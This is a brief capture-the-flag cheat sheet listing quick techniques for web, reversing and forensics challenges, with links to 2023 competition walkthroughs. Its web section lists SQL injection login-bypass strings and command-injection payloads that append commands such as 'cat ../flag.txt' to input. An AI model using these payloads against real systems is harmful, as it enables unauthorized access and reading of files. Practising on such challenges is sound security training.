Web
* (SQL Inj) Attempt login with: admin' OR 1=1, ' OR 1=1-- -, " OR 1=1-- -, " OR 1 or ", admin"-- -", admin;-- -'
* [Admin Access through weak password update process - Walkthrough](https://siunam321.github.io/ctf/Cyber-Apocalypse-2023/Web/Passman/)
* (OS Inj) Run [valid input] followed by: || cat ../flag.txt, | cat ../flag.txt, && cat ../flag.txt, & cat ../flag.txt, ; cat ../flag.txt
* 

Reversing
* Run "Strings <file> | grep flag" 
* [Excellent Reversing Examples - NitroLabs](https://nitrolabs.xyz/posts/HTB-CA2023-Reversing-HW-Misc/)

Forensics
* [Excellent Forensics Examples - NitroLabs](https://nitrolabs.xyz/posts/HTB-CA2023-Forensics/)  
* Wireshark Filter: http contains flag, tcp contains flag
  * Right-click packet and select "Follow stream"
* [Chainsaw - Windows Forensics Tool - GitHub](https://github.com/WithSecureLabs/chainsaw)  

*ps1 = Powershell
